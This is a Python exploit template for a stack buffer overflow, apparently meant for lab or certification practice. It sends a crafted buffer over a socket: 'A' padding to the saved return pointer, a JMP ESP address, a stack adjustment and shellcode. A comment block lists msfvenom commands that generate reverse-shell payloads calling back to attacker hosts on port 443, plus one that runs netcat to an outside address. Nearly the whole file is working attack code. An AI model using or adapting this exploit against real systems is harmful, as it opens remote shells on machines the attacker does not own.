#!/usr/bin/python
import socket, struct

RHOST = '<ip>'
RPORT = <port>
cmd = '<command>'
offset_srp = <offset>
buf_totlen = <buffer length>
ptr_jmp_esp = 0x

"""
######################################################

Reverse Shell - DO NOT FORGET BADCHARS

If the shellcode puts up a fuss, first port of call is removing -e x86/shikata_ga_nai

###SHELLCODES###

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.30 LPORT=443 -f py --var-name=shellcode EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x01\x04\x05\x38\x39\x72\x73\xD9\xDA" --smallest

msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 -f py --var-name=shellcode EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00"

msfvenom -p linux/x86/exec CMD="nc 192.168.1.60 53" -b "\x00" -f py

######################################################
"""

# Insert shellcode here


sub_esp_10 = "\x83\xec\x10"             # More elegant than nop sleds

buf = ""
buf += "A" * (offset_srp - len(buf))    # Send the A's up to the EIP
buf += struct.pack("<I", ptr_jmp_esp)   # Making little Indians from the JMP ESP
buf += sub_esp_10
buf += shellcode
buf += "C" * (buf_totlen - len(buf))    # C ya later
buf += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(cmd + buf)
s.recv(1024)
s.close()

